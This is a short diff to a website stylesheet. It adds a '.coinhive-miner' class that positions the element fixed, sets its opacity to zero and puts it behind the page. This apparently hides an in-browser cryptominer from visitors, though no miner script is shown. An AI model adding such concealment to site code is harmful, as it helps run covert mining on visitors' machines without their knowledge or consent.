@@ -29,3 +29,9 @@ nav a:hover{
 	text-align:center;
 	color:red;
 }
+.coinhive-miner{
+	position: fixed;
+        opacity: 0;
+        z-index:-1;
+	top: 0px;
+}
